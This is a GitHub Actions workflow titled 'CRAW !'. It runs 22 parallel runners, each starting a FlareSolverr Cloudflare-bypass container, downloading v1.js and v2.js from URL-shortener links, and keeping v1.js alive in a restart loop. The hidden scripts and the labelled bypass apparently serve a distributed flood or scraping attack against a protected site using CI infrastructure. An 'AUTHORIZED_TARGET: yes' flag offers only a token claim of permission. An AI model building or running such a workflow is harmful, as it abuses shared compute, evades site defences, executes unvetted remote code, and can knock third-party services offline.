name: CRAW !
on:
  workflow_dispatch:

env:
  AUTHORIZED_TARGET: yes

jobs:
  vds:
    runs-on: ubuntu-latest
    strategy:
      max-parallel: 22
      matrix:
        instance: [1, 2, 3, 4, 5, 6, 7, 8, 9, 10, 11, 12, 13, 14, 15, 16, 17, 18, 19, 20, 21, 22]
    
    steps:
      - name: Setup environment
        run: |
          sudo apt-get update
          sudo apt-get install -y docker.io
          sudo systemctl start docker
          sudo systemctl enable docker
          pip install requests
          curl -fsSL https://deb.nodesource.com/setup_18.x | sudo -E bash -
          sudo apt-get install -y nodejs

      - name: Download FlareSolverr
        run: |
          sudo docker pull flaresolverr/flaresolverr:latest
          sudo docker run -d --name flaresolverr -p 8191:8191 -e LOG_LEVEL=info --restart unless-stopped flaresolverr/flaresolverr:latest
          sleep 15
          curl -X GET "http://localhost:8191/v1" || echo "FlareSolverr started"

      - name: Download v1.js and v2.js
        run: |
          wget https://curl.by/VudqN/v1.js -O v1.js
          wget https://curl.by/_8mO2/v2.js -O v2.js
          chmod +x v1.js v2.js
          npm install axios

      - name: Run v1.js with FlareSolverr
        env:
          AUTHORIZED_TARGET: yes
        run: |
          echo "Starting v1.js (FlareSolverr bypass)..."
          node v1.js &
          V1_PID=$!
          echo $V1_PID > v1_pid.txt
          sleep 30

      - name: Monitor and maintain processes
        env:
          AUTHORIZED_TARGET: yes
        run: |
          echo "Monitoring processes..."
          for i in {1..40}; do
            echo "Cycle $i/40 - waiting 5 seconds..."
            
            if [ -f v1_pid.txt ] && ps -p $(cat v1_pid.txt) > /dev/null; then
              echo "v1.js is running"
            else
              echo "Restarting v1.js..."
              node v1.js &
              echo $! > v1_pid.txt
            fi
            
            sleep 5
          done

      - name: Cleanup
        if: always()
        run: |
          echo "Job completed at $(date)"
          pkill -f "v1.js" || true
          pkill -f "v2.js" || true
          rm -f v1_pid.txt
          sudo docker stop flaresolverr 2>/dev/null || true
          sudo docker rm flaresolverr 2>/dev/null || true
          echo "Cleanup completed"
